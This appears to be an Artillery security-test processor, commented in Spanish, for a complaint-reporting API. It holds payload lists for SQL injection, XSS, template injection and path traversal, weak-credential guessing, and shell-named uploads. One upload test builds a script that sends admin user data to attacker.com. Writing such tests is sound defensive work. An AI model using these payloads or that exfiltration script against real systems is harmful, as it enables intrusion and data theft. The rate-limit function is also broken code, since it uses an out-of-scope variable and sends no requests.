/**
 * Processor para Artillery - Pruebas de Seguridad
 * Funciones personalizadas para automatizar pruebas de seguridad
 */

const crypto = require('crypto');

// Función para probar rate limiting
function testRateLimiting(requestParams, context, ee, next) {
  // Simular múltiples requests rápidos para probar rate limiting
  const requests = [];
  
  for (let i = 0; i < 15; i++) {
    requests.push({
      method: 'POST',
      url: '/api/denuncias/codigo',
      json: {
        code: `DEN-20250101-TEST${i}`
      }
    });
  }
  
  // Ejecutar requests en paralelo
  Promise.all(requests.map(req => {
    return new Promise((resolve) => {
      setTimeout(() => {
        context.vars.rateLimitTest = true;
        resolve();
      }, i * 100);
    });
  })).then(() => {
    next();
  });
}

// Función para probar headers de seguridad
function testSecurityHeaders(requestParams, context, ee, next) {
  const securityHeaders = [
    'X-Frame-Options',
    'X-Content-Type-Options',
    'X-XSS-Protection',
    'Referrer-Policy',
    'Content-Security-Policy',
    'Permissions-Policy'
  ];
  
  context.vars.expectedHeaders = securityHeaders;
  context.vars.securityTest = true;
  
  next();
}

// Función para generar datos de prueba maliciosos
function generateMaliciousData(requestParams, context, ee, next) {
  const maliciousPayloads = [
    '<script>alert("XSS")</script>',
    '"; DROP TABLE users; --',
    '../../../etc/passwd',
    '${7*7}',
    '{{7*7}}',
    '{{config}}',
    '{{request}}',
    '{{request.environ}}'
  ];
  
  context.vars.maliciousPayload = maliciousPayloads[Math.floor(Math.random() * maliciousPayloads.length)];
  context.vars.maliciousTest = true;
  
  next();
}

// Función para probar inyección SQL
function testSQLInjection(requestParams, context, ee, next) {
  const sqlInjectionPayloads = [
    "' OR '1'='1",
    "'; DROP TABLE users; --",
    "' UNION SELECT * FROM users --",
    "admin'--",
    "1' OR '1' = '1' --",
    "1'; INSERT INTO users VALUES ('hacker', 'password'); --"
  ];
  
  context.vars.sqlInjectionPayload = sqlInjectionPayloads[Math.floor(Math.random() * sqlInjectionPayloads.length)];
  
  // Modificar el request para incluir payload malicioso
  if (requestParams.json) {
    requestParams.json.code = context.vars.sqlInjectionPayload;
  }
  
  next();
}

// Función para probar XSS
function testXSS(requestParams, context, ee, next) {
  const xssPayloads = [
    '<script>alert("XSS")</script>',
    '<img src="x" onerror="alert(\'XSS\')">',
    '<svg onload="alert(\'XSS\')">',
    'javascript:alert("XSS")',
    '"><script>alert("XSS")</script>',
    '\'><script>alert("XSS")</script>'
  ];
  
  context.vars.xssPayload = xssPayloads[Math.floor(Math.random() * xssPayloads.length)];
  
  // Modificar el request para incluir payload XSS
  if (requestParams.json) {
    requestParams.json.story = context.vars.xssPayload;
  }
  
  next();
}

// Función para probar path traversal
function testPathTraversal(requestParams, context, ee, next) {
  const pathTraversalPayloads = [
    '../../../etc/passwd',
    '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
    '....//....//....//etc/passwd',
    '..%2F..%2F..%2Fetc%2Fpasswd',
    '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
  ];
  
  context.vars.pathTraversalPayload = pathTraversalPayloads[Math.floor(Math.random() * pathTraversalPayloads.length)];
  
  // Modificar la URL para incluir payload de path traversal
  if (requestParams.url && requestParams.url.includes('uploads')) {
    requestParams.url = requestParams.url.replace('test.jpg', context.vars.pathTraversalPayload);
  }
  
  next();
}

// Función para probar CSRF
function testCSRF(requestParams, context, ee, next) {
  // Simular request sin token CSRF
  delete requestParams.headers['X-CSRF-Token'];
  delete requestParams.headers['X-XSRF-Token'];
  
  context.vars.csrfTest = true;
  
  next();
}

// Función para probar autenticación débil
function testWeakAuth(requestParams, context, ee, next) {
  const weakPasswords = [
    'admin',
    'password',
    '123456',
    'qwerty',
    'admin123',
    'root',
    'test',
    'guest'
  ];
  
  const weakUsernames = [
    'admin',
    'root',
    'test',
    'guest',
    'user',
    'demo'
  ];
  
  context.vars.weakUsername = weakUsernames[Math.floor(Math.random() * weakUsernames.length)];
  context.vars.weakPassword = weakPasswords[Math.floor(Math.random() * weakPasswords.length)];
  
  if (requestParams.json) {
    requestParams.json.username = context.vars.weakUsername;
    requestParams.json.password = context.vars.weakPassword;
  }
  
  next();
}

// Función para probar file upload malicioso
function testMaliciousFileUpload(requestParams, context, ee, next) {
  const maliciousFiles = [
    { name: 'script.js', type: 'application/javascript' },
    { name: 'shell.php', type: 'application/x-php' },
    { name: 'backdoor.asp', type: 'application/x-asp' },
    { name: 'malware.exe', type: 'application/x-executable' },
    { name: 'test.jpg.php', type: 'image/jpeg' },
    { name: 'test.jpg;.php', type: 'image/jpeg' }
  ];
  
  const maliciousFile = maliciousFiles[Math.floor(Math.random() * maliciousFiles.length)];
  context.vars.maliciousFileName = maliciousFile.name;
  context.vars.maliciousFileType = maliciousFile.type;
  
  // Crear contenido malicioso
  const maliciousContent = `
    <script>
      fetch('/api/admin/users').then(r => r.json()).then(d => {
        fetch('https://attacker.com/steal', {
          method: 'POST',
          body: JSON.stringify(d)
        });
      });
    </script>
  `;
  
  context.vars.maliciousContent = maliciousContent;
  
  next();
}

// Función para validar respuestas de seguridad
function validateSecurityResponse(requestParams, response, context, ee, next) {
  const securityChecks = {
    headersPresent: false,
    rateLimitHeaders: false,
    securityHeaders: false,
    noSensitiveData: true
  };
  
  // Verificar headers de seguridad
  const requiredHeaders = [
    'X-Frame-Options',
    'X-Content-Type-Options',
    'X-XSS-Protection'
  ];
  
  securityChecks.headersPresent = requiredHeaders.every(header => 
    response.headers[header.toLowerCase()] !== undefined
  );
  
  // Verificar headers de rate limiting
  securityChecks.rateLimitHeaders = response.headers['x-ratelimit-limit'] !== undefined;
  
  // Verificar que no hay datos sensibles en la respuesta
  if (response.body) {
    const sensitivePatterns = [
      /password/i,
      /secret/i,
      /api_key/i,
      /token/i,
      /private_key/i
    ];
    
    securityChecks.noSensitiveData = !sensitivePatterns.some(pattern => 
      pattern.test(response.body)
    );
  }
  
  // Loggear resultados
  console.log('🔒 Security Check Results:', {
    url: requestParams.url,
    statusCode: response.statusCode,
    securityChecks
  });
  
  context.vars.securityChecks = securityChecks;
  
  next();
}

// Función para generar reporte de seguridad
function generateSecurityReport(requestParams, response, context, ee, next) {
  if (!context.vars.securityReport) {
    context.vars.securityReport = {
      totalRequests: 0,
      securityViolations: 0,
      rateLimitHits: 0,
      suspiciousActivity: 0,
      vulnerabilities: []
    };
  }
  
  context.vars.securityReport.totalRequests++;
  
  // Detectar violaciones de seguridad
  if (response.statusCode === 429) {
    context.vars.securityReport.rateLimitHits++;
  }
  
  if (response.statusCode >= 500) {
    context.vars.securityReport.vulnerabilities.push({
      type: 'Server Error',
      url: requestParams.url,
      statusCode: response.statusCode
    });
  }
  
  // Detectar actividad sospechosa
  if (context.vars.maliciousTest || context.vars.sqlInjectionPayload || context.vars.xssPayload) {
    context.vars.securityReport.suspiciousActivity++;
  }
  
  next();
}

module.exports = {
  testRateLimiting,
  testSecurityHeaders,
  generateMaliciousData,
  testSQLInjection,
  testXSS,
  testPathTraversal,
  testCSRF,
  testWeakAuth,
  testMaliciousFileUpload,
  validateSecurityResponse,
  generateSecurityReport
}; 